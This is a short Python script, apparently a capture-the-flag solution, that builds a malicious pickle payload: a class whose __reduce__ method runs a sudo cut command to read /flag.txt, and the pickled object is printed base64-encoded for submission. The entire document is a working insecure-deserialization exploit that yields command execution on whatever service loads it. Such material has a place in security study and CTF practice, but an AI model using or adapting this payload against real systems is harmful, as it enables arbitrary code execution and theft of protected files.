import pickle
import base64

class Exploit:
    def __reduce__(self):
        import subprocess
        cmd = ["sudo", "/usr/bin/cut", "-d", " ", "-f1", "/flag.txt"]
        return (subprocess.check_output, (cmd,))

payload = base64.urlsafe_b64encode(pickle.dumps(Exploit())).decode()
print(payload)
